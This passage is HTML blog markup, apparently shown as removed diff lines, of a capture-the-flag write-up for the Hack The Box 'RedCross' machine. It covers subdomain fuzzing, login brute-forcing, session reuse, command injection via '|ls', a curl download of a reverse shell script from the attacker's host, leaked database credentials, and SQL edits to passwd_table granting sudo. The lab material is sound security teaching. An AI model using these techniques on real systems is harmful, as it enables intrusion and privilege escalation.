-&lt;h4 id=&quot;responses-for-non-existing-subdomains-are-28-words-so-i-stopped-the-scan-to-add---hw-28-to-filter-these-responses-&quot;&gt;Responses for non-existing subdomains are 28 words so I stopped the scan to add &lt;code class=&quot;highlighter-rouge&quot;&gt;--hw 28&lt;/code&gt; to filter these responses :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz -c -w subdomains-top1mil-5000.txt -H &quot;HOST:FUZZ.redcross.htb&quot; https://redcross.htb&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/redcross/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-we-got-adminredcrosshtb--so-i-added-it-to-etchosts-&quot;&gt;And we got &lt;code class=&quot;highlighter-rouge&quot;&gt;admin.redcross.htb&lt;/code&gt; , So I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;note--to-enumerate-every-subdoamin-there-has-to-be-an-entry-for-that-subdomain-in-etchosts-that-points-to-the-ip-of-the-box--thats-why-i-added-the-host-http-header--h-hostfuzzredcrosshtb--it-solves-the-problem&quot;&gt;Note : to enumerate every subdoamin there has to be an entry for that subdomain in &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; that points to the ip of the box , that’s why I added the &lt;code class=&quot;highlighter-rouge&quot;&gt;HOST&lt;/code&gt; HTTP header (&lt;code class=&quot;highlighter-rouge&quot;&gt;-H &quot;HOST:FUZZ.redcross.htb&quot;&lt;/code&gt;) , it solves the problem.&lt;/h4&gt;
-&lt;h4 id=&quot;now-lets-go-to-adminredcrosshtb-and-see-whats-there-&quot;&gt;Now let’s go to &lt;code class=&quot;highlighter-rouge&quot;&gt;admin.redcross.htb&lt;/code&gt; and see what’s there :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;it-asks-for-login--we-will-get-into-this-later-but-lets-go-back-to-intraredcrosshtb-and-see-what-can-we-do-from-there&quot;&gt;It asks for login , we will get into this later but let’s go back to &lt;code class=&quot;highlighter-rouge&quot;&gt;intra.redcross.htb&lt;/code&gt; and see what can we do from there.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-need-to-login--i-tried-to-bruteforce-the-login-with-wfuzz--so-i-intercepted-the-request-with-burp-to-see-the-parameters-&quot;&gt;We need to login , I tried to bruteforce the login with wfuzz , so I intercepted the request with &lt;code class=&quot;highlighter-rouge&quot;&gt;burp&lt;/code&gt; to see the parameters :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;then-i-used-wfuzz-like-we-did-before-i-filtered-responses-with-32-chars-i-used-a-small-list-for-common-credentials-like-adminadmin-top-usernames-shortlisttxt-from-seclists&quot;&gt;Then I used wfuzz like we did before (I filtered responses with 32 chars). I used a small list for common credentials like &lt;code class=&quot;highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt;, &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt&quot;&gt;top-usernames-shortlist.txt&lt;/a&gt; from seclists.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz -c --hh 11 -u &quot;https://intra.redcross.htb/pages/actions.php&quot; -X POST -d &quot;user=FUZZ&amp;amp;pass=FUZZ&amp;amp;action=login&quot; -w top-usernames-shortlist.txt&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/redcross/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;guestguest-gave-us-a-different-response-lets-try-it-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;guest:guest&lt;/code&gt; gave us a different response. Let’s try it :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-it-worked-and-we-see-this-message-&quot;&gt;And it worked. And we see this message :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;From: admin (uid 1)	To: guest (uid 5)
-
-You're granted with a low privilege access while we're processing your credentials request. Our messaging system still in beta status. Please report if you find any incidence.
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;broken-session-management--admin-panel&quot;&gt;Broken Session Management , Admin Panel&lt;/h3&gt;
-&lt;h4 id=&quot;after-some-enumeration-i-found-that-after-being-authenticated-as-guest-on-intraredcrosshtb-you-can-use-the-session-id-on-adminredcrosshtb-and-it-will-work-&quot;&gt;After some enumeration I found that after being authenticated as &lt;code class=&quot;highlighter-rouge&quot;&gt;guest&lt;/code&gt; on &lt;code class=&quot;highlighter-rouge&quot;&gt;intra.redcross.htb&lt;/code&gt; you can use the session id on &lt;code class=&quot;highlighter-rouge&quot;&gt;admin.redcross.htb&lt;/code&gt; and it will work :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/12.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/redcross/13.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/redcross/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;now-we-have-access-to-the-admin-panel--there-are-two-areas--user-management-and-network-access&quot;&gt;Now we have access to the admin panel , there are two areas : &lt;code class=&quot;highlighter-rouge&quot;&gt;User Management&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Network Access&lt;/code&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;user-management-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;User Management&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;can-we-really-add-users--lets-try-test-&quot;&gt;Can we really add users ? Let’s try &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/16.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/redcross/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;nice-it-gave-us-the-credentials--lets-try-ssh-&quot;&gt;Nice it gave us the credentials , let’s try ssh :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-it-worked--but-it-seems-like-we-are-not-on-the-actual-host--we-are-in-a-container-or-a-jail--lets-look-at-home-&quot;&gt;And it worked , but it seems like we are not on the actual host , we are in a container or a jail , let’s look at &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;interface_data-and-public--last-thing-i-checked-was-etcpasswd-to-know-any-possible-user-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;interface_data&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;public&lt;/code&gt; ? Last thing I checked was &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; to know any possible user :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;theres-a-user-called-penelope--but-no-home-directory-for-penelope-so-i-gave-up-on-this-and-looked-at-network-access-&quot;&gt;There’s a user called &lt;code class=&quot;highlighter-rouge&quot;&gt;penelope&lt;/code&gt; , but no &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory for &lt;code class=&quot;highlighter-rouge&quot;&gt;penelope&lt;/code&gt;. So I gave up on this and looked at &lt;code class=&quot;highlighter-rouge&quot;&gt;Network Access&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;i-added-my-ip-address-to-the-whitelist&quot;&gt;I added my ip address to the whitelist:&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;then-i-scanned-the-box-with-nmap-again-to-see-if-some-new-ports-show-up-&quot;&gt;Then I scanned the box with nmap again to see if some new ports show up :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/59.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/redcross/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;theres-ftp-on-port-21-anonymous-login-not-allowed-postgresql-sql-database-on-port-5432-and-a-service-on-port-1025-but-nmap-couldnt-really-identify-it-now-there-are-two-ways-to-continue--i-will-show-the-rce-first&quot;&gt;there’s ftp on port 21 (anonymous login not allowed), &lt;code class=&quot;highlighter-rouge&quot;&gt;postgresql SQL database&lt;/code&gt; on port 5432 and a service on port 1025 but nmap couldn’t really identify it. Now there are two ways to continue , I will show the RCE first.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;rce-on-adminredcrosshtb--reverse-shell-as-www-data&quot;&gt;RCE on &lt;code class=&quot;highlighter-rouge&quot;&gt;admin.redcross.htb&lt;/code&gt; , Reverse Shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt;&lt;/h3&gt;
-&lt;h4 id=&quot;on-the-network-access-section-you-can-add-and-remove-ips-from-the-whitelist--i-added-a-random-ip--lets-say-11111111-and-intercepted-the-two-requests-with-burp-&quot;&gt;On the &lt;code class=&quot;highlighter-rouge&quot;&gt;Network Access&lt;/code&gt; Section you can add and remove ips from the whitelist , I added a random ip , let’s say &lt;code class=&quot;highlighter-rouge&quot;&gt;11.11.11.11&lt;/code&gt; and intercepted the two requests with &lt;code class=&quot;highlighter-rouge&quot;&gt;burp&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;allow-request-&quot;&gt;Allow request :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;response-&quot;&gt;Response :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;deny-request-&quot;&gt;Deny request :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;response--1&quot;&gt;Response :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-notice-that-its-saying-executing-iptables--so-the-ip-we-provide-will-be-a-part-of-a-system-command-i-added-ls-to-the-ip-parameter-in-the-deny-request-and-got-this-response-&quot;&gt;We notice that it’s saying &lt;code class=&quot;highlighter-rouge&quot;&gt;Executing iptables&lt;/code&gt; , so the ip we provide will be a part of a system command. I added &lt;code class=&quot;highlighter-rouge&quot;&gt;|ls&lt;/code&gt; to the ip parameter in the deny request and got this response :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/28.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/redcross/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;nice-we-have-an-rce--lets-get-a-reverse-shell--i-created-a-reverse-shell-and-called-it-shellsh-&quot;&gt;Nice we have an RCE , let’s get a reverse shell , I created a reverse shell and called it &lt;code class=&quot;highlighter-rouge&quot;&gt;shell.sh&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;then-i-hosted-it-on-a-python-simple-http-server--and-downloaded-it-on-the-box--curl-http1010xxxxshellsh--tmpshellsh&quot;&gt;Then I hosted it on a python simple HTTP server , and downloaded it on the box : &lt;code class=&quot;highlighter-rouge&quot;&gt;curl http://10.10.xx.xx/shell.sh &amp;gt; /tmp/shell.sh&lt;/code&gt;&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;python-server-&quot;&gt;Python Server :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;lets-verify-that-the-shell-is-on-the-box-&quot;&gt;Let’s verify that the shell is on the box :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/33.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/redcross/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;nice-lets-execute-&quot;&gt;Nice let’s execute :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;bash /tmp/shell.sh&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/redcross/35.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/redcross/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-got-a-shell-as-www-data-&quot;&gt;We got a shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-we-see-in-home-a-directory-for-penelope--but-we-cant-read-the-user-flag&quot;&gt;And we see in &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; a directory for &lt;code class=&quot;highlighter-rouge&quot;&gt;penelope&lt;/code&gt; , but we can’t read the user flag.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;hardcoded-postgresql-database-credentials--privilege-escalation-to-root&quot;&gt;Hardcoded PostgreSQL Database Credentials , Privilege Escalation to root&lt;/h3&gt;
-&lt;h4 id=&quot;in-the-root-directory-of-the-web-application--theres-an-interseting-php-file-called-actionsphp-interesting-because-it-handled-everything--we-saw-it-earlier-in-all-the-post-requests-i-looked-into-it-and-found-credentials-for-a-db-user-called-unixusrmgr-&quot;&gt;In the root directory of the web application , there’s an interseting &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file called &lt;code class=&quot;highlighter-rouge&quot;&gt;actions.php&lt;/code&gt;. Interesting because it handled everything , we saw it earlier in all the POST requests. I looked into it and found credentials for a db user called &lt;code class=&quot;highlighter-rouge&quot;&gt;unixusrmgr&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if($action==='del'){
-        header('refresh:1;url=/?page=users');
-        $uid=$_POST['uid'];
-        $dbconn = pg_connect(&quot;host=10.10.10.113 dbname=unix user=unixusrmgr password=dheu%7wjx8B&amp;amp;&quot;);
-        $result = pg_prepare($dbconn, &quot;q1&quot;, &quot;delete from passwd_table where uid = $1&quot;);
-        $result = pg_execute($dbconn, &quot;q1&quot;, array($uid));
-        echo &quot;User account deleted&quot;;
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;we-knew-earlier-that-the-database-is-postgresql--lets-connect-&quot;&gt;We knew earlier that the database is &lt;code class=&quot;highlighter-rouge&quot;&gt;PostgreSQL&lt;/code&gt; , let’s connect :&lt;/h4&gt;
-&lt;h4 id=&quot;some-cheatcheets-for-postgresql-&quot;&gt;Some Cheatcheets for &lt;code class=&quot;highlighter-rouge&quot;&gt;PostgreSQL&lt;/code&gt; :&lt;/h4&gt;
-&lt;h4 id=&quot;github&quot;&gt;&lt;a href=&quot;https://gist.github.com/Kartones/dd3ff5ec5ea238d4c546&quot;&gt;Github&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;postgresqltutorialcom&quot;&gt;&lt;a href=&quot;http://www.postgresqltutorial.com/postgresql-cheat-sheet/&quot;&gt;postgresqltutorial.com&lt;/a&gt;&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;psql -h 127.0.0.1 -d unix -U unixusrmgr&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/redcross/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;dt-to-list-the-tables-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;\dt&lt;/code&gt; to list the tables :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;i-did-select--from-passwd_table-and-got-some-users-with-their-password-hashes-and-other-info--so-i-went-back-to-the-admin-panel-and-added-a-user-called-rick-&quot;&gt;I did &lt;code class=&quot;highlighter-rouge&quot;&gt;select * from passwd_table;&lt;/code&gt; and got some users with their password hashes and other info , so I went back to the admin panel and added a user called &lt;code class=&quot;highlighter-rouge&quot;&gt;rick&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;then-i-did-select--from-passwd_table-again-&quot;&gt;Then I did &lt;code class=&quot;highlighter-rouge&quot;&gt;select * from passwd_table;&lt;/code&gt; again :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-notice-that-the-homedir-is-set-to-varjailhome-thats-why-we-cant-access-the-actual-host-with-created-users-also-the-gid-is-set-to-1001-lets-set-that-to-0-root-&quot;&gt;We notice that the &lt;code class=&quot;highlighter-rouge&quot;&gt;homedir&lt;/code&gt; is set to &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/jail/home&lt;/code&gt; that’s why we can’t access the actual host with created users. Also the &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt; is set to &lt;code class=&quot;highlighter-rouge&quot;&gt;1001&lt;/code&gt;. Let’s set that to &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; (root) :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;update passwd_table set gid=0 where gid=1001;&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/redcross/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;now-the-gid-is-0-&quot;&gt;Now the &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;lets-also-change-the-homedir-&quot;&gt;Let’s also change the &lt;code class=&quot;highlighter-rouge&quot;&gt;homedir&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;update passwd_table set homedir='/home' where homedir='/var/jail/home';&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/redcross/47.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/redcross/48.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;lets-login-with-ssh-again-&quot;&gt;Let’s login with ssh again :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;by-checking-our-gid-&quot;&gt;by checking our &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;its-root--we-still-cant-read-the-flags-&quot;&gt;It’s &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; , we still can’t read the flags :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/51.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-cant-also-sudo-&quot;&gt;We can’t also &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/52.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;weird--i-checked-etcsudoers-and-saw-this-line-&quot;&gt;Weird , I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/sudoers&lt;/code&gt; and saw this line :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;if-we-got-the-gid-of-the-group-sudo--we-will-be-able-to-run-sudo&quot;&gt;If we got the &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt; of the group &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; , we will be able to run sudo.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cat /etc/group | grep sudo&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/redcross/54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;the-gid-is-27--lets-return-to-the-database-and-change-our-gid-from-0-to-27-&quot;&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;27&lt;/code&gt; , let’s return to the database and change our &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;27&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;update passwd_table set gid=27 where gid=0;&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/redcross/55.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;select * from passwd_table;&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/redcross/56.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;great--lets-terminate-our-ssh-connection-and-login-again-we-are-now-a-member-of-sudo-and-we-can-run-sudo--so-sudo-su-will-give-us-a-root-shell&quot;&gt;Great , let’s terminate our ssh connection and login again. We are now a member of &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; and we can run &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; , so &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo su&lt;/code&gt; will give us a root shell.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;lets-read-the-user-flag-&quot;&gt;Let’s read the user flag :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;before-reading-the-root-flag-lets-see-how-can-we-actually-get-a-user-shell-as-penelope&quot;&gt;Before reading the root flag let’s see how can we actually get a user shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;penelope&lt;/code&gt;&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;vulnerable-smtp-server-haraka&quot;&gt;Vulnerable SMTP Server (Haraka)&lt;/h3&gt;
-&lt;h4 id=&quot;back-to-the-admin-panel--after-whitelisting-the-ip-and-doing-a-second-nmap-scan-&quot;&gt;Back to the admin panel , after whitelisting the ip and doing a second nmap scan :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/59.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/redcross/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;port-1025-was-open-and-nmap-couldnt-identify-it-i-tried-several-ways-to-connect-to-that-port-nc--telnet--ftp-etc&quot;&gt;Port 1025 was open and nmap couldn’t identify it. I tried several ways to connect to that port, &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;telnet&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; etc…&lt;/h4&gt;
-&lt;h4 id=&quot;fortunately-ftp-gave-me-this-banner-&quot;&gt;Fortunately &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; gave me this banner :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;that-version-of-the-smtp-server-is-vulnerable-to-a-command-injection-and-theres-a-metasploit-module-for-it-&quot;&gt;That version of the &lt;code class=&quot;highlighter-rouge&quot;&gt;SMTP&lt;/code&gt; server is vulnerable to a command injection and there’s a metasploit module for it :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/62.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/redcross/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;thats-how-to-get-a-shell-on-the-box-without-the-rce-in-the-web-application&quot;&gt;That’s how to get a shell on the box without the RCE in the web application.&lt;/h4&gt;
-&lt;h4 id=&quot;we-can-get-a-shell-by-typing-shell--and-we-are-penelope-so-we-can-read-the-user-flag-&quot;&gt;We can get a shell by typing &lt;code class=&quot;highlighter-rouge&quot;&gt;shell&lt;/code&gt; , and we are &lt;code class=&quot;highlighter-rouge&quot;&gt;penelope&lt;/code&gt; so we can read the user flag :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/64.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;after-that-we-will-do-the-same-thing-we-did-with-the-database-and-users-we-already-did-it-so-we-wont-do-it-again-back-to-our-ssh-connection-lets-read-the-root-flag-&quot;&gt;After that we will do the same thing we did with the database and users. We already did it so we won’t do it again. Back to our ssh connection let’s read the root flag :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
